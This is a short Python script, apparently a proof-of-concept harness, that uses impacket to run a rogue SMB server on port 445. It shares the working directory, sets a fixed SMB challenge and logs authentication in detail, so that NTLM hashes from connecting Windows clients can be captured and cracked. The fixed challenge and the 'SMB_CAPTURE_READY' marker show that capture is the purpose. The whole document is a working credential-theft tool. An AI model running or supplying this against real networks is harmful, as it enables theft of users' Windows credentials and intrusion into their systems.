import logging,os
from impacket import smbserver
logging.basicConfig(level=logging.DEBUG,format="%(asctime)s %(levelname)s %(message)s")
s=smbserver.SimpleSMBServer(listenAddress="0.0.0.0",listenPort=445)
s.addShare("SHARE",os.getcwd(),"proof")
s.setSMB2Support(True)
s.setSMBChallenge("5444584e544c4d31")
print("SMB_CAPTURE_READY",flush=True)
s.start()
